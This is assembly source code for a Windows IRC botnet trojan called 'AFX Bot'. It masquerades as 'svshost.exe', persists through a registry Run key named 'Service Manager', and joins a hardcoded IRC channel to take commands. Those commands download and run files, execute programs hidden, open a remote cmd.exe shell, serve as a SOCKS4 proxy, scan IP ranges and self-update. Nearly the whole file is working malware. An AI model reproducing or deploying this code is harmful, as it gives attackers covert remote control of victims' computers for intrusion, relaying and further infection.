.386
.model flat, stdcall
option casemap:none

include         windows.inc
include         advapi32.inc
includelib      advapi32.lib

include         kernel32.inc
includelib      kernel32.lib

include         user32.inc
includelib      user32.lib

include         masm32.inc
includelib      masm32.lib

include         urlmon.inc
includelib      urlmon.lib

include         wsock32.inc
includelib      wsock32.lib

ParseCommand proto :dword, :dword, :dword, :dword, :dword

.data
;you must use the /makehash function that comes with the mIRC script to set this
szEncryptionKey           byte 4, 14, 5, 15, 12, 5, 12, 9, 26, 25, 0

szPass                    byte '719258520', 0
szVersion                 byte '0.2', 0

szServerName              byte 'svshost.exe', 0
szRegName                 byte 'Service Manager', 0
szIRCServer               byte 'irc.irc-hispano.org', 0
dwServerPort              dword 6667

szMainChannel             byte '#sector-virus_bots', 0
szChannelKey              byte '.', 0

;change these to rename the commands
szAUTH                    byte '.login', 0 
szCLONE                   byte '.clone', 0
szDIE                     byte '.die', 0
szDOWNLOAD                byte '.download', 0
szHTTPD                   byte '.httpd', 0
szKILLTHREAD              byte '.killthread', 0
szPROXYD                  byte '.proxyd', 0
szRAW                     byte '.raw', 0
szRESTART                 byte '.restart', 0
szREMOVE                  byte '.remove', 0
szRUN                     byte '.run', 0
szSCAN                    byte '.scan', 0
szSHELL                   byte '.shelld', 0
szSTATUS                  byte '.status', 0
szTHREADS                 byte '.threads', 0
szUPDATE                  byte '.update', 0
szVISIT                   byte '.visit', 0

;silent and verbose flags
szSILENT                  byte '-s', 0
szVERBOSE                 byte '-v', 0

;bot reply messages and misc strings
szAbout                   byte 'AFX Bot %s by Aphex', 0
szAuth                    byte 'password accepted', 0
szBanner                  byte 'AFX BOT SHELL SERVER', 13, 10, 0
szCommandLine             byte 'cmd.exe', 0
szClone                   byte 'clone created on %s port %s', 0
szDie                     byte 'die command issued', 0
szDownload                byte 'downloading %s to %s', 0
szDownloaded              byte 'downloaded %s to %s', 0
szDownloadThread          byte 'download (%s:%s)', 0
szHttpd                   byte 'httpd serving %s on port %s', 0
szHttpdThread             byte 'httpd (%s:%s)', 0
szIrcThread               byte 'irc (%s:%s)', 0
szRestart                 byte 'restarting bot', 0
szRemoveCommand           byte '@echo off', 13, 10, ':start1', 13, 10, 'if not exist %s goto done1', 13, 10, 'del %s', 13, 10, 'goto start1', 13, 10, ':done1', 13, 10, 'del remove.bat', 0
szRemove_                 byte 'removing bot', 0
szRun                     byte 'ran %s', 0
szRunFail                 byte '%s is not a valid command', 0
szOpenPort                byte '%s port %s is open', 0
szProxyd                  byte 'socks4 proxy active on port %s accepting user %s', 0
szProxydThread            byte 'proxyd (%s:%s)', 0
szScan                    byte 'scan %s started on port %s with a delay of %sms', 0
szServerConnect           byte 'creating new thread for %s on %s port %d as %s', 0
szShell                   byte 'remote shell active on port %d', 0
szShellThread             byte 'shelld (%d)', 0
szScanThread              byte 'scan (%s:%s)', 0
szStatus                  byte 'Version: %s - IP: %s - OS: Windows %s - Started: %d/%d/%d', 0
szThread                  byte '%s. %s', 0
szThreads                 byte '[thread list]', 0
szThreadsKilled           byte 'thread(s) killed', 0
szUpdate                  byte 'updating from version %s with %s', 0
szUpdateCommand           byte '@echo off', 13, 10, ':start1', 13, 10, 'if not exist %s goto done1', 13, 10, 'del %s', 13, 10, 'goto start1', 13, 10, ':done1', 13, 10, '~update.exe', 13, 10, ':start2', 13, 10, 'if not exist ~update.exe goto done2', 13, 10, 'del ~update.exe', 13, 10, 'goto start2', 13, 10, ':done2', 13, 10, 'del update.bat', 0
szVisit                   byte 'visting %s', 0
szBack                    byte '\', 0
szIdent                   byte '%s, %s : USERID : UNIX : %s', 0
szRegValue                byte 'Software\Microsoft\Windows\CurrentVersion\Run', 0
szRemoveBatch             byte 'remove.bat', 0
szUpdateBatch             byte 'update.bat', 0
szUpdateName              byte '~update.exe', 0
szOS0                     byte 'NT', 0
szOS1                     byte '95', 0
szOS2                     byte '98', 0
szOS3                     byte 'ME', 0
szOS4                     byte '2000', 0
szOS5                     byte 'XP', 0
szOS6                     byte '2003', 0
sz001                     byte '001', 0
sz005                     byte '005', 0
sz433                     byte '433', 0
szDCC                     byte 1, 'DCC', 0
szJOIN                    byte 'JOIN %s %s', 13, 10, 0
szMSG                     byte 'PRIVMSG %s :%s', 13, 10, 0
szNICK                    byte 'NICK %s', 13, 10, 0
szPING                    byte 'PING', 0
szPONG                    byte 'PONG %s', 13, 10, 0
szPRIVMSG                 byte 'PRIVMSG', 0
szUSER                    byte 'USER %s 0 0 :%s', 13, 10, 0

.data?
sSystemTime               SYSTEMTIME <>
dwYear                    dword ?
dwMonth                   dword ?
dwDay                     dword ?
dwHour                    dword ?
dwMinute                  dword ?
dwSecond                  dword ?

;public buffers
szDataBuffer              byte 1024 dup (?)
szSendBuffer              byte 1024 dup (?)

;private buffers
szParseBuffer             byte 1024 dup (?)
dwStartHigh               dword ?
dwStartLow                dword ?
szRandNum                 byte 16 dup (?)
szRandNick                byte 32 dup (?)
szMaster                  byte 64 dup (?)
szKey                     byte 64 dup (?)
dwNickPointer             dword ?


WSAData                   WSADATA <>

;nick name list module
include nicks.asm

;useful routine module
include procedures.asm

;thread management module
include threads.asm

;installation module
include install.asm

;irc encryption module
include encryption.asm

;irc engine module
include irc.asm

;http server module
include httpd.asm

;ip scanner module
include scanner.asm

;remote shell module
include shelld.asm

;socks4 proxy server module
include socks4.asm

.code
ParseCommand proc uses eax edx ecx esi edi dwsocket:dword, szUser:dword, szReply:dword, szCmd:dword, szarguments:dword
local dwSocket:dword
local dwBytes:dword
local dwPort:dword
local szSilent[8]:byte
local szArguments:dword
local download:URL_DOWNLOAD
local scan:IP_SCANNER
local szServerBuffer[32]:byte
local szNickBuffer[32]:byte
local szChannelBuffer[32]:byte
local szPortBuffer[8]:byte
local szIP[32]:byte
local dwThread: dword
local SockAddrIn:sockaddr_in
local sOSInfo:OSVERSIONINFO
local ospt:dword
local shelld:SHELL_SERVER
local bCalc:byte

invoke GetToken, addr szParseBuffer, szarguments, 32, 2, FALSE
invoke lstrcpy, addr szSilent, addr szParseBuffer
;check for -s flag
invoke lstrcmpi, addr szSilent, addr szSILENT
.if eax == 0
.else  
  ;check for -v flag
  invoke lstrcmpi, addr szSilent, addr szVERBOSE
  .if eax == 0
    mov eax, dwsocket
    mov dwSocket, eax
  .else
    ;not a valid command
    jmp @F  
  .endif
.endif

mov eax, szarguments
add eax, 3
mov szArguments, eax

invoke lstrcmpi, szUser, addr szMaster
.if eax != 0
  invoke lstrcmpi, szCmd, addr szAUTH
  .if eax == 0
    invoke GetToken, addr szServerBuffer, szArguments, 32, 2, FALSE
    invoke lstrcmpi, addr szServerBuffer, addr szPass
    .if eax == 0
      invoke lstrcpy, addr szMaster, szUser
      invoke SendMsg, dwSocket, szReply, addr szAuth
    .else
      jmp @F
    .endif
  .else
    jmp @F
  .endif  
.endif      

;handle thread commands
invoke ThreadProc, dwSocket, szUser, szReply, szCmd, szArguments
.if eax == TRUE
  jmp @F
.endif  

;create new irc thread
invoke lstrcmpi, szCmd, addr szCLONE
.if eax == 0
  invoke GetToken, addr szServerBuffer, szArguments, 32, 2, FALSE
  invoke GetToken, addr szPortBuffer, szArguments, 32, 3, FALSE
  invoke GetToken, addr szNickBuffer, szArguments, 32, 4, FALSE
  invoke GetToken, addr szChannelBuffer, szArguments, 32, 5, FALSE
  invoke atodw, addr szPortBuffer
  mov dwPort, eax
  invoke IrcConnect, addr szChannelBuffer, addr szNickBuffer, addr szServerBuffer, dwPort
  invoke wsprintf, addr szParseBuffer, addr szServerConnect, addr szChannelBuffer, addr szServerBuffer, dwPort, addr szNickBuffer
  invoke SendMsg, dwSocket, szReply, addr szParseBuffer
  jmp @F
.endif

;kill the bot
invoke lstrcmpi, szCmd, addr szDIE
.if eax == 0
  invoke SendMsg, dwSocket, szReply, addr szDie
  invoke WSACleanup
  invoke ExitProcess, 0
.endif

;restart the bot
invoke lstrcmpi, szCmd, addr szRESTART
.if eax == 0
  invoke SendMsg, dwSocket, szReply, addr szRestart
  invoke closesocket, dwSocket
  invoke WSACleanup
  invoke WinExec, addr szSystemPath, 0
  invoke ExitProcess, 0
.endif

;download url to file
invoke lstrcmpi, szCmd, addr szDOWNLOAD
.if eax == 0
  mov eax, dwSocket
  mov download.dwsocket, eax
  invoke GetToken, addr szParseBuffer, szArguments, 32, 2, FALSE
  invoke lstrcpy, addr download.szurl, addr szParseBuffer
  invoke GetToken, addr szParseBuffer, szArguments, 32, 3, FALSE
  invoke lstrcpy, addr download.szfilename, addr szParseBuffer
  mov download.bsync, 0
  invoke CopyMemory, addr download.szreply, szReply, 64
  invoke CreateThread, 0, 0, addr DownloadThread, addr download, 0, 0
  mov dwThread, eax
  .while download.bsync != 1
    invoke Sleep, 10
  .endw
  mov ecx, download.dwselfhandle
  push ecx
  invoke wsprintf, addr szParseBuffer, addr szDownloadThread, addr download.szurl, addr download.szfilename
  pop ecx
  invoke AddThread, dwThread, addr szParseBuffer, 0, ecx
  invoke wsprintf, addr szParseBuffer, addr szDownload, addr download.szurl, addr download.szfilename
  invoke SendMsg, dwSocket, szReply, addr szParseBuffer
  mov eax, TRUE
  jmp @F
.endif

;send raw text to irc server
invoke lstrcmpi, szCmd, addr szRAW
.if eax == 0
  invoke lstrcpy, addr szParseBuffer, szArguments
  invoke lstrlen, addr szParseBuffer
  mov ecx, eax
  mov edi, offset szParseBuffer
  add edi, ecx
  mov al, 13
  stosb
  mov al, 10
  stosb
  add ecx, 2
  invoke send, dwSocket, addr szParseBuffer, ecx, 0
  jmp @F
.endif

;remove server
invoke lstrcmpi, szCmd, addr szREMOVE
.if eax == 0
  invoke SendMsg, dwSocket, szReply, addr szRemove
  invoke CreateFile, addr szRemoveBatch, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0
  mov ecx, eax
  push ecx
  push ecx
  invoke wsprintf, addr szParseBuffer, addr szRemoveCommand, addr szSystemPath, addr szSystemPath
  invoke lstrlen, addr szParseBuffer
  mov edx, eax
  pop ecx
  invoke WriteFile, ecx, addr szParseBuffer, edx, addr dwBytes, 0
  pop ecx
  invoke CloseHandle, ecx
  invoke RegOpenKeyEx, HKEY_LOCAL_MACHINE, addr szRegValue, 0, KEY_ALL_ACCESS, addr RegKey
  invoke RegDeleteValue, RegKey, addr szRegName
  invoke RegCloseKey, RegKey
  invoke WSACleanup
  invoke WinExec, addr szRemoveBatch, 0
  invoke ExitProcess, 0
.endif

;run command
invoke lstrcmpi, szCmd, addr szRUN
.if eax == 0
  invoke GetToken, addr szParseBuffer, szArguments, 32, 2, FALSE
  mov sStartupInfo.dwFlags, STARTF_USESHOWWINDOW
  mov sStartupInfo.wShowWindow, SW_HIDE
  invoke CreateProcess, 0, addr szParseBuffer, 0, 0, FALSE, 0, 0, 0, addr sStartupInfo, addr sProcessInfo
  .if eax == TRUE
    invoke wsprintf, addr szParseBuffer, addr szRun, szArguments
    invoke SendMsg, dwSocket, szReply, addr szParseBuffer
  .elseif
    invoke wsprintf, addr szParseBuffer, addr szRunFail, szArguments
    invoke SendMsg, dwSocket, szReply, addr szParseBuffer
  .endif  
.endif

;spawn shell thread
invoke lstrcmpi, szCmd, addr szSHELL
.if eax == 0
  invoke GetToken, addr szPortBuffer, szArguments, 32, 2, FALSE
  invoke atodw, addr szPortBuffer
  mov shelld.dwport, eax
  mov shelld.bsync, 0
  invoke CreateThread, 0, 0, addr Shelld, addr shelld, 0, 0
  push eax
  .while shelld.bsync != 1
    invoke Sleep, 10
  .endw
  invoke wsprintf, addr szParseBuffer, addr szShellThread, shelld.dwport
  pop eax
  invoke AddThread, eax, addr szParseBuffer, shelld.dwsocket, 0
  invoke wsprintf, addr szParseBuffer, addr szShell, shelld.dwport
  invoke SendMsg, dwSocket, szReply, addr szParseBuffer
  jmp @F
.endif

;display status
invoke lstrcmpi, szCmd, addr szSTATUS
.if eax == 0
  mov sOSInfo.dwOSVersionInfoSize, sizeof OSVERSIONINFO
  invoke GetVersionEx, addr sOSInfo
  .if sOSInfo.dwMajorVersion == 3
    mov ospt, offset szOS0
  .elseif sOSInfo.dwMajorVersion == 4
    .if sOSInfo.dwMinorVersion == 10
      mov ospt, offset szOS2
    .elseif sOSInfo.dwMinorVersion == 90
      mov ospt, offset szOS3
    .elseif sOSInfo.dwPlatformId == 2
      mov ospt, offset szOS0
    .else
      mov ospt, offset szOS1
    .endif
  .elseif sOSInfo.dwMajorVersion == 5
    .if sOSInfo.dwMinorVersion == 0
      mov ospt, offset szOS4
    .else
      mov ospt, offset szOS5
    .endif
  .else
    mov ospt, offset szOS6
  .endif

  xor eax, eax
  mov ax, sSystemTime.wYear
  mov dwYear, eax
  xor eax, eax
  mov ax, sSystemTime.wMonth
  mov dwMonth, eax
  xor eax, eax
  mov ax, sSystemTime.wDay
  mov dwDay, eax
  invoke _GetIP
  mov ecx, eax   
  invoke wsprintf, addr szParseBuffer, addr szStatus, addr szVersion, ecx, ospt, dwMonth, dwDay, dwYear
  invoke SendMsg, dwSocket, szReply, addr szParseBuffer
  jmp @F
.endif

;update server
invoke lstrcmpi, szCmd, addr szUPDATE
.if eax == 0
  invoke GetToken, addr szParseBuffer, szArguments, 32, 2, FALSE
  invoke lstrcmpi, addr szParseBuffer, addr szVersion
  .if eax != 0
    mov eax, dwSocket
    mov download.dwsocket, eax
    invoke GetToken, addr szParseBuffer, szArguments, 32, 3, FALSE
    invoke lstrcpy, addr download.szurl, addr szParseBuffer
    mov eax, dwSocket
    mov download.dwsocket, eax
    mov download.bsync, 0
    invoke CreateThread, 0, 0, addr UpdateThread, addr download, 0, 0
    mov dwThread, eax
    .while download.bsync != 1
      invoke Sleep, 10
    .endw
    invoke wsprintf, addr szParseBuffer, addr szDownloadThread, addr download.szurl, addr download.szfilename
    invoke AddThread, dwThread, addr szParseBuffer, 0, download.dwselfhandle
    invoke wsprintf, addr szParseBuffer, addr szUpdate, addr szVersion, addr download.szurl
    invoke SendMsg, dwSocket, szReply, addr szParseBuffer
  .endif  
  mov eax, TRUE
  jmp @F
.endif

;visit url
invoke lstrcmpi, szCmd, addr szVISIT
.if eax == 0
  invoke GetToken, addr szParseBuffer, szArguments, 32, 2, FALSE
  invoke URLDownloadToFile, 0, addr szParseBuffer, 0, 0, 0
  invoke wsprintf, addr szParseBuffer, addr szVisit, addr szParseBuffer
  invoke SendMsg, dwSocket, szReply, addr szParseBuffer
  mov eax, TRUE
  jmp @F
.endif

invoke ProxydProc, dwSocket, szUser, szReply, szCmd, szArguments
.if eax == TRUE
  jmp @F
.endif  


invoke ScanProc, dwSocket, szUser, szReply, szCmd, szArguments
.if eax == TRUE
  jmp @F
.endif  

invoke HttpdProc, dwSocket, szUser, szReply, szCmd, szArguments
.if eax == TRUE
  jmp @F
.endif  
@@:
ret
ParseCommand endp 

start:
invoke GetSystemTime, addr sSystemTime
invoke Install
invoke DecryptKey
mov eax, offset szNicks
mov dwNickPointer, eax
invoke GetRandNick
invoke IrcConnect, addr szMainChannel, dwNickPointer, addr szIRCServer, dwServerPort
.while TRUE
  invoke Sleep, 60000
.endw
end start


